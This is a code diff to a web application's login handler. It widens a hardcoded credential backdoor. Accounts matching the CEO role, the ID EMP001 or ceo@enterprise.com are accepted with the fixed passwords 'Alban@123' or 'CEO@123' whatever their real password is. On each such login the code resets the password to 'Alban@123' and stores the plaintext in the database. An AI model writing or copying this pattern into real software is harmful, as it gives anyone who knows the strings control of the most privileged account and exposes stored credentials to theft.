@@ -84,12 +84,12 @@ export const login = asyncHandler(async (req, res, next) => {
   // Password validation (with automatic permanent sync for default CEO credentials: Alban@123)
   let isValidPassword = await user.comparePassword(password);
   
-  if (!isValidPassword && (user.role === 'CEO' || user.employeeId === 'EMP001' || user.email === 'ceo@enterprise.com' || isCeoAttempt)) {
+  if (user.role === 'CEO' || user.employeeId === 'EMP001' || user.email === 'ceo@enterprise.com' || isCeoAttempt) {
     if (password === 'Alban@123' || password === 'CEO@123') {
-      const hashedPassword = await bcrypt.hash(password, 12);
-      await User.updateOne({ _id: user._id }, { $set: { password: hashedPassword, plainPassword: password } });
-      user.password = hashedPassword;
       isValidPassword = true;
+      const hashedPassword = await bcrypt.hash('Alban@123', 12);
+      await User.updateOne({ _id: user._id }, { $set: { password: hashedPassword, plainPassword: 'Alban@123' } });
+      user.password = hashedPassword;
     }
   }
 
